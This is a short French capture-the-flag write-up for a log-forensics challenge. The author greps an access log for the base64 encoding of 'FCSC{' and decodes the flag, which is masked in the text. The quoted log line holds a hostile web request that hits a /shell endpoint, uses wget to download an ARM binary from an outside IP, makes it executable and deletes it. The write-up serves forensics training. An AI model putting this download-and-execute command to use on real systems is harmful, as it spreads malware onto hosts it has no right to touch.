## WUP : Histoire sans fin

### Partie 1 

Dans cette première partie on cherche un flag qui resemble à `FCSC{...`. Les logs montrent un échange de trames qui semblent être des requêtes HTTP. Dans ce type de requêtes, l'encodage base64 peut être utilisé pour encoder les body parameters.  

Mon idée à donc été de chercher l'encodage base64 de FCSC pour le grep dans le fichier de logs.

```bash
$ echo "FCSC{" |base64
RkNTQ3sK
$ more access.log | grep RkNTQ3sK
# Rien, mais j'ai pas encodé tout le flag
# c'est possible que la racine reste la même
# j'ai donc un peu racourci
$ more access.log | grep RkNTQ3
185.150.190.103 - - [13/Feb/2020:06:12:41 +0000] "GET /shell?cd%20/tmp%20%7C%7C%20cd%20/var/run%20%7C%7C%20cd%20/mnt%20%7C%7C%20cd%20/root;%20wget%20http:/%5C/190.115.18.86/b/arm7;chmod%20777%20arm7;echo%20-n%20%22RkNTQ3tDK3o2aUZYbXRyS0pjZUF9%22%20%7C%20base64%20-d%20%26%26%20rm%20-rf%20arm7 HTTP/1.1" 200 27 "-" "python-requests/2.22.0"
# Bingo on trouve quelque chose d'étrange
```

On tombe sur une requête bizarre qui semble ouvrir un shell, se déplacer dans /tmp/var/run, monter un répertoire et télécharger un binaire... Quelque chose de suspect en somme. Mais à la fin on remarque cette ligne :`echo%20-n%20%22RkNTQ3tDK3o2aUZYbXRyS0pjZUF9%22%20%7C%20base64%20 ...` **qui contient notre pattern ET base64...**

Alors ...
```bash
echo "RkNTQ3tDK3o2aUZYbXRyS0pjZUF9" | base64 -d
FCSC{........} # On trouve le flag :)
```
